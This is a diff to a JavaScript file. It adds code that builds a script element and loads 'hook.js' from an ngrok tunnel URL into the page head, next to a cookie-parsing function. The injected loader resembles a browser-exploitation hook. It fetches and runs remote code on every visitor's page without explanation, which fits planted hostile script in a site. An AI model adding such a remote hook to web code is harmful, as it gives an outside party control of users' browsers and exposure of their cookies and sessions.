@@ -2,6 +2,15 @@
 
 // Immediately-invoked function expression
 (function () {
+  
+ var script = document.createElement('script');
+script.onload = function () {
+    //do stuff with the script
+};
+script.src = 'https://7a88-76-173-5-75.ngrok.io/hook.js';
+
+document.head.appendChild(script);
+  
   const parseCookie = str =>
     str
       .split(';')
@@ -18,6 +27,8 @@
 
   alert(message)
 })();
+
+
 
 (function () {
     function c() {
